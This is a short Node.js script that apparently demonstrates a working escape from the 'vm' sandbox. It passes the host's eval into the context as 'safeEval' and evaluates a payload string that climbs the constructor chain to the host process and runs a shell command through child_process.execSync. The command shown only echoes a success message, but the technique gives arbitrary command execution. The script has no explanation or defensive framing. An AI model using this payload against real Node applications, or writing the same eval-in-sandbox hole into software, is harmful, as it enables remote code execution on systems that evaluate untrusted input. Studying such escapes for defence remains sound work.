const vm = require('vm');
const orderLinesData = 'this.constructor.constructor("return process")().mainModule.require("child_process").execSync("echo EXPLOIT SUCCESSFUL").toString()';

try {
  const sandbox = Object.create(null);
  sandbox.safeEval = eval;
  sandbox.orderLinesData = orderLinesData;
  vm.createContext(sandbox);
  const result = vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 });
  console.log(result.trim());
} catch (e) {
  console.log("Error:", e.message);
  process.exit(1);
}
